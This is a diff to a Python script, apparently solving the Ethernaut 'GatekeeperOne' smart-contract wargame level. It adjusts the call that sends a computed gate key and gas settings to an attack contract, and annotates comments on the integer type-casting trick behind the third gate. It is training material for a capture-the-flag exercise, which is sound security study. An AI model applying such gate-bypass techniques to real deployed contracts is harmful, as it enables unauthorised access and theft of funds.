@@ -19,9 +19,12 @@ def main():
     target = interface.IGatekeeperOne(ETHERNAUT_INSTANCE)
 
     gate_key = int(GATE_HEX, 16)
-    print(gate_key)
 
-    attack.attack(gate_key, GAS_AMOUNT, {"from": player})
+    attack.attack(
+        gate_key,
+        GAS_AMOUNT,
+        {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True},
+    )
 
     # check that we've won by confirming that 'entrant' = player
     print(f"Entrant is {target.entrant()}")
@@ -51,6 +54,6 @@ def main():
 
 # GateThree - part 3
 #
-# uint16(unit160)         -> reutrns first 2 of 20 bytes
+# uint16(unit160)         -> reutrns first 2 of 20 bytes        <-- the GATEKEY !!
 # uint32(uint64(bytes8))  -> bytes8 is reprepresented by uint64
 #                         -> uint32 of uint64 returns first 4 of 8 bytes
